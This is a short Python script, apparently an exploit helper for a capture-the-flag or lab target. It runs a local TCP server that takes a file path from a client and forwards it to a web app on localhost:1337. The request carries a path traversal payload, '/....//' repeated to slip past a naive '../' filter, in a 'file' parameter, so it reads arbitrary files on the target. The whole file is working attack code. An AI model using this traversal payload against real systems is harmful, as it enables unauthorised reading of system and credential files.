import socket
import socketserver

class RequestHandler(socketserver.BaseRequestHandler):
    def handle(self):
        # Send a welcome message or instructions to the client
        self.request.sendall(b"Enter a path fetch':\n")

        # Receive the user input (path) from the client
        user_input = self.request.recv(1024).strip().decode('utf-8')

        if user_input:
            # Append the user input to the base URL and send the GET request
            full_url = f"http://localhost:1337/?file=/....//....//....//....//....//....//....//{user_input}"
            response = self.send_get_request(full_url)

            # Send the server's response back to the client
            self.request.sendall(response.encode())
        else:
            self.request.sendall(b"No input received.\n")

    def send_get_request(self, url):
        try:
            host = "localhost"
            port = 1337

            # The path is the part of the URL after 'localhost:1337/'
            path = "/" + "/".join(url.split("/")[3:]) if len(url.split("/")) > 3 else "/"

            # Create a socket to connect to the web server
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((host, port))
                
                # Send the GET request
                request = f"GET {path} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"
                s.sendall(request.encode())
                
                # Receive the response from the server
                response = s.recv(4096).decode('utf-8')

            return response
        except Exception as e:
            return f"Error sending GET request: {e}"

def run_server():
    # Setup the server to listen on port 9999
    with socketserver.TCPServer(("localhost", 9999), RequestHandler) as server:
        print("Server running on port 9999...")
        server.serve_forever()

if __name__ == "__main__":
    run_server()